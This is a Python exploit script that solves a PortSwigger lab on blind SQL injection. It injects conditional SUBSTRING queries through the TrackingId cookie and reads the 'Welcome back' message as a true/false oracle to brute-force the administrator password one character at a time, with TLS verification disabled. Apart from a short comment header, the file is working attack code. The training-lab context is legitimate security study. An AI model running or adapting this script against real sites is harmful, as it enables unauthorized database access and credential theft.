# Lab 11 — Blind SQL Injection: Conditional Responses
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
#
# Vulnerability: TrackingId cookie
# Aim:           Extract the administrator password character by character
#
# Signal: "Welcome back!" appears in the page when the injected condition is TRUE.
#         No message when FALSE. This is your only oracle.
#
# Technique:
#   1. Confirm boolean blind: ' AND '1'='1 (shows message) vs ' AND '1'='2 (no message)
#   2. Enumerate password chars using SUBSTRING(password, position, 1) = 'char'
#   3. Iterate positions 1–20, chars a–z + 0–9
#
# Usage: python lab11.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PASSWORD_LENGTH = 20
CHARSET         = "abcdefghijklmnopqrstuvwxyz0123456789"


if __name__ == "__main__":
    banner()
    section("LAB 11 — BLIND SQLi: CONDITIONAL RESPONSES")

    if len(sys.argv) != 2:
        print("  Usage: python lab11.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    # Fetch the page to capture the assigned TrackingId cookie
    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    print(f"\n  TrackingId: {tracking_id}")
    print(f"  Enumerating {PASSWORD_LENGTH} characters from charset: {CHARSET}\n")

    password = ""

    for i in range(1, PASSWORD_LENGTH + 1):
        for char in CHARSET:
            # Inject a conditional: TRUE only when SUBSTRING(password, i, 1) = char
            payload  = (
                f"{tracking_id}' AND "
                f"(SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}'--"
            )
            response = session.get(url, cookies={"TrackingId": payload})

            if "Welcome back" in response.text:
                password += char
                sys.stdout.write(f"\r  ★  Found so far: {password}")
                sys.stdout.flush()
                break
            else:
                # Show currently tested character without newline
                sys.stdout.write(f"\r  ⟳  Position {i}: trying '{char}'  ")
                sys.stdout.flush()

    print(f"\n\n  ★  Administrator password: {password}")
